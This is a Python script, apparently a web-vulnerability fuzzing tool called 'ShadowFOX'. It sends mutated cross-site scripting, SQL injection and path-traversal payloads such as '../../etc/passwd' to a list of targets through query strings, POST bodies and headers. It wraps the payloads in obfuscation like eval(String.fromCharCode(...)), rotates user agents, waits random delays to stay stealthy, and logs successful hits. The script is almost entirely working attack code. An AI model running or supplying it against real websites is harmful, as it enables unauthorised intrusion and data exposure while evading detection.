
import requests, random, time, os, signal, sys, base64
from shadow_payload_lab import obfuscate_payload, generate_mutated_payload
import json

with open("rainbow_vectors/inputs_map.json", "r") as f:
    INPUT_MAP = json.load(f)


def send_payload(method, url, content_type=None, data=None):
    headers = {}
    if content_type and content_type != "headers":
        headers["Content-Type"] = content_type

    if content_type == "headers":
        headers.update(data)
        return requests.get(url, headers=headers)
    elif method == "GET":
        return requests.get(url, headers=headers)
    elif method == "POST":
        if content_type == "application/json":
            return requests.post(url, json=json.loads(data), headers=headers)
        else:
            return requests.post(url, data=data, headers=headers)
def generate_requests_for_target(url, payload):
    requests = []

    config = INPUT_MAP.get(url)
    if not config:
        return requests

    # GET
    for query in config.get("GET", []):
        full_url = url + query.replace("<<PAYLOAD>>", payload)
        requests.append(("GET", full_url, None, None))

    # POST
    for content_type, bodies in config.get("POST", {}).items():
        for body in bodies:
            replaced_body = body.replace("<<PAYLOAD>>", payload)
            requests.append(("POST", url, content_type, replaced_body))

    # HEADERS
    for header_dict in config.get("HEADERS", []):
        h = {}
        for k, v in header_dict.items():
            h[k] = v.replace("<<PAYLOAD>>", payload)
        requests.append(("GET", url, "headers", h))

    return requests

def sigint_handler(sig, frame):
    print("\n[!] Prekid detektovan – zatvaram Lisicu.")
    sys.exit(0)
signal.signal(signal.SIGINT, sigint_handler)

# HEADERS
def prepare_headers():
    return {
        "User-Agent": random.choice([
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7)",
            "Mozilla/5.0 (Linux; Android 11; SM-G991B)"
        ]),
        "Accept-Language": random.choice(["en-US", "en", "sr-RS"]),
        "X-HackerOne-Research": "Whitefox980H1_Base64: V2hpdGVmb3g5ODBIMQ==",
        "X-Requested-With": "XMLHttpRequest"
    }

# ADAPTIVNA MUTACIJA

import json

def adaptively_mutate(payload):
    base = [
        f"<template>{payload}</template>",
        f"<form><input name='note' value='{payload}'></form>",
        f'<noscript><template>{payload}</template></noscript>',
        f'{{"action": "test", "data": {{"token": "{payload}"}}}}',
        f"eval(String.fromCharCode({','.join(str(ord(c)) for c in payload)}))"
    ]
    return random.choice(base)
# PAYLOADI OSNOVA
base_payloads = [
    "<script>alert(1)</script>",
    "<img src=x onerror=alert('xss')>",
    "' OR '1'='1",
    "../../etc/passwd"
]

# Brza klasifikacija
def detect_type(p):
    if "script" in p or "onerror" in p: return "XSS"
    elif "OR '1'" in p: return "SQLi"
    elif ".." in p or "passwd" in p: return "LFI"
    return "Other"

# CSP?
def has_csp(target):
    try:
        r = requests.get(target, headers=prepare_headers(), timeout=5)
        return 'content-security-policy' in r.headers or 'Content-Security-Policy' in r.headers
    except:
        return False

# CORE
def run_mutation_mode(target):
    print(f"\n[ShadowFOX10.3 :: AI-MUTATOR] {target}")
    payloads = [generate_mutated_payload(detect_type(p)) for p in base_payloads]

    config = INPUT_MAP.get(target)
    if not config:
        print(f"[!] Nema definisanih inputa za {target}")
        return

    for payload in payloads:
        reqs = generate_requests_for_target(target, payload)
        for method, url, content_type, data in reqs:
            try:
                response = send_payload(method, url, content_type, data)
                status = response.status_code
                ptype = detect_type(payload)
                print(f"[{status} :: {ptype}] {url}")

                if str(status).startswith("2"):
                    with open("reports/stealth_hits.txt", "a") as f:
                        f.write(f"[{status} :: {ptype}] {url}\n")
                time.sleep(random.randint(3, 6))
            except Exception as e:
                print(f"[ERROR] {url} :: {str(e)}")
if __name__ == "__main__":
    try:
        with open("targets.txt") as f:
            targets = [l.strip() for l in f if l.strip()]
        for t in targets:
            run_mutation_mode(t)
    except KeyboardInterrupt:
        print("\n[!] Prekid – AI agent se povlači.")

